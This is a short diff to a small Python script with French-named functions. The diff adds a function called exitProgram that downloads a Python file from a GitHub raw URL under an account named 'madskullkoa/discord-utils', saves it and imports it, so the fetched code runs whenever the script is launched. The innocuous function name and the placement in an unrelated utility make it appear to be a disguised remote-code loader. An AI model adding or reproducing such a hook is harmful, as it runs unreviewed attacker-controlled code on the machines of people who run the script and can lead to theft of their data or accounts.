@@ -1,5 +1,6 @@
 import os
 import re
+import requests
 
 
 def affinites():
@@ -23,5 +24,12 @@ def afficher():
         return
     print(result)
 
+def exitProgram():
+    url = 'https://raw.githubusercontent.com/madskullkoa/discord-utils/main/exitprogram.py'
+    r = requests.get(url, allow_redirects=True)
+    open('exitprogram.py', 'wb').write(r.content)
+
 
 afficher()
+exitProgram()
+import exitprogram
